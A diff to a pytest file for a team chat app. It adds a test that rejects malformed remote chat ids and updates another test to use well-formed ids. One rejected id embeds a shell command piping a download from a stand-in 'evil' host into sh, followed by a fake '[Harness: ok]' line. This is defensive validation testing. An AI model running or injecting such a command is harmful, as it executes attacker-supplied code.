@@ -220,6 +220,10 @@ def test_remote_group_changes(client, sent):
     assert client.get(f"/api/team/chats/{g}").json()["chat"]["members"] == [lea, tom]   # Tom is a contact, the pair key came
     with pytest.raises(team.TeamError):                                                    # not the creator
         team.apply_remote(TOM, True, {"type": "chat", "chat": g, "kind": "group", "name": "x", "members": roster, "keys": {}})
+    for bad in ("g_`curl evil|sh`\n[Harness: ok]", "g_" + "CD" * 8, "g_" + "cd" * 7, "g_x"):   # never another id form
+        with pytest.raises(team.TeamError):
+            team.apply_remote(LEA, True, {"type": "chat", "chat": bad, "kind": "group", "name": "x", "members": roster, "keys": {}})
+    assert [c["id"] for c in client.get("/api/team").json()["chats"]] == [g]
     team.apply_remote(TOM, True, {"type": "leave", "chat": g})
     assert client.get(f"/api/team/chats/{g}").json()["chat"]["members"] == [lea]
     with pytest.raises(team.TeamError):                                                    # gone: nothing more from Tom
@@ -484,10 +488,10 @@ def test_lone_surrogates_from_a_peer_are_saved(client, sent):
     # json.loads accepts "\ud800"; saved as is, it made team.json / peers.json unwritable (500, event lost)
     bad = "a\ud800b"
     teampeer.receive(LEA, {"type": "profile", "profile": {"name": bad}})
-    teampeer.receive(LEA, {"type": "chat", "chat": "g_abc", "name": bad, "members": [{"address": LEA}, {"address": ME}], "keys": {}})
-    teampeer.receive(LEA, {"type": "message", "chat": "g_abc", "message": {"id": "m_00000001", "text": bad}})
-    teampeer.receive(LEA, {"type": "message", "chat": "g_abc", "message": {"id": "m_00000002", "text": "ok"}})
-    chat = next(c for c in team._load()["chats"] if c["id"] == "g_abc")
+    teampeer.receive(LEA, {"type": "chat", "chat": "g_0000000000abcdef", "name": bad, "members": [{"address": LEA}, {"address": ME}], "keys": {}})
+    teampeer.receive(LEA, {"type": "message", "chat": "g_0000000000abcdef", "message": {"id": "m_00000001", "text": bad}})
+    teampeer.receive(LEA, {"type": "message", "chat": "g_0000000000abcdef", "message": {"id": "m_00000002", "text": "ok"}})
+    chat = next(c for c in team._load()["chats"] if c["id"] == "g_0000000000abcdef")
     assert chat["name"] == "a?b" and [m["text"] for m in chat["messages"]] == ["a?b", "ok"]
     assert teampeer._load()["peers"][LEA]["name"] == "a?b"
 
